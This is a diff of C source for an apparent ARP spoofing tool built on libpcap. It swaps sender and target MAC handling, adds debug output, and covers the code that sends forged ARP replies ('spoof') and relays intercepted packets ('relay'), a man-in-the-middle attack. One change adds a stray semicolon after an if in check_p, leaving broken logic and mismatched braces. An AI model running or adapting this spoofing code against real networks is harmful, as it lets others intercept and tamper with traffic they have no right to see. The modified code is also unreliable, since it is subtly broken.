@@ -63,7 +63,7 @@ struct eth_arp{
 struct t_index{
 	struct eth_arp s_arp;
 	char * dev;
-	unsigned char * s_mac;
+	unsigned char * t_mac;
 };
 #pragma pack(8)
 void debug(struct eth_arp s_arp){
@@ -93,6 +93,7 @@ void debug(struct eth_arp s_arp){
 	for(int i=0;i<sizeof(s_arp.a.target_mac);i++)printf("%x",s_arp.a.target_mac[i]);
 	puts("");
 	printf("arp taraget_ip : %x\n",s_arp.a.target_ip);
+	puts("\n");
 }
 
 struct eth_arp getmac(struct eth_arp s_arp,char * dev){
@@ -119,6 +120,7 @@ uint32_t getIpAddress (const char * ifr) {
         perror( "ioctl() SIOCGIFADDR error");  
         return -1;  
     }  
+
     sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
     memcpy((uint32_t*)&src_ip,(void*)&sin->sin_addr, sizeof(sin->sin_addr));  
     close(sockfd);  
@@ -131,11 +133,11 @@ int check_p(const u_char* packet2,struct eth_arp s_arp){
 	if(target->e.e_type==s_arp.e.e_type){
 //		if(memcmp(target->e.des_mac,"\xff\xff\xff\xff\xff\xff",6)!=-1){
 //				printf("BC\n");
-			if(target->a.sender_mac!=s_arp.a.target_mac){
+			if(target->a.sender_mac!=s_arp.a.target_mac);
 				return 0;
 			}
 	//	}
-	}
+
 	return -1;
 }
 void *thread_main(void *arg){
@@ -159,11 +161,12 @@ void *thread_main(void *arg){
 			if(memcmp(t1->e.des_mac,argv.s_arp.e.src_mac,6)!=-1){
 				for(int i =0;i<6;i++){
   					t1->e.src_mac[i]=argv.s_arp.e.src_mac[i];
-					t1->e.des_mac[i]=argv.s_mac[i];
+					t1->e.des_mac[i]=argv.t_mac[i];
 				}
 			}
 			pcap_sendpacket(handle,(unsigned char *)t1,header->caplen);  //relay
 		}else{
+			debug(argv.s_arp);
   			pcap_sendpacket(handle,(unsigned char *)&argv.s_arp,42); //spoof
 		}
 	}
@@ -205,10 +208,10 @@ int main(int argc, char* argv[]) {
   	res = pcap_next_ex(handle, &header, &packet2);	
 	if (res == 0) continue;
     	if (res == -1 || res == -2) break;
-	memcpy(t_ip,packet2+28,4);
-	memcpy(t_mac,packet2+22,6);
+	memcpy(s_ip,packet2+28,4);
+	memcpy(s_mac,packet2+22,6);
 	
-	if(memcmp((char *)t_ip,(char *)&s_arp.a.target_ip,4)!=-1){		
+	if(memcmp((char *)s_ip,(char *)&s_arp.a.target_ip,4)!=-1){		
 		break;
 	}else{
 		continue;
@@ -222,10 +225,10 @@ int main(int argc, char* argv[]) {
 	res = pcap_next_ex(handle, &header, &packet2);
 	if (res == 0) continue;
     	if (res == -1 || res == -2) break;
-	memcpy(s_ip,packet2+28,4);
-	memcpy(s_mac,packet2+22,6);
+	memcpy(t_ip,packet2+28,4);
+	memcpy(t_mac,packet2+22,6);
 	
-	if(memcmp((char *)s_ip,(char *)&s_arp.a.target_ip,4)!=-1){
+	if(memcmp((char *)t_ip,(char *)&s_arp.a.target_ip,4)!=-1){
 		break;
 	}else{
 		continue;
@@ -233,14 +236,14 @@ int main(int argc, char* argv[]) {
   }
   
   s_arp.a.opcode=0x0200;
-  memcpy(s_arp.e.des_mac,t_mac,6);
-  memcpy(s_arp.a.target_mac,t_mac,6);
+  memcpy(s_arp.e.des_mac,s_mac,6);
+  memcpy(s_arp.a.target_mac,s_mac,6);
   inet_pton(AF_INET,argv[i+3],(uint32_t*)&s_arp.a.sender_ip);
   inet_pton(AF_INET,argv[i+2],(uint32_t*)&s_arp.a.target_ip);
   
   argvs.s_arp = s_arp;
   argvs.dev = dev;
-  argvs.s_mac = s_mac;
+  argvs.t_mac = t_mac;
   pcap_sendpacket(handle,(const u_char *)&s_arp,42);
   if(pthread_create(&t_id[j],NULL,thread_main,(void *)&argvs)!=0){
 	puts("thread Error");
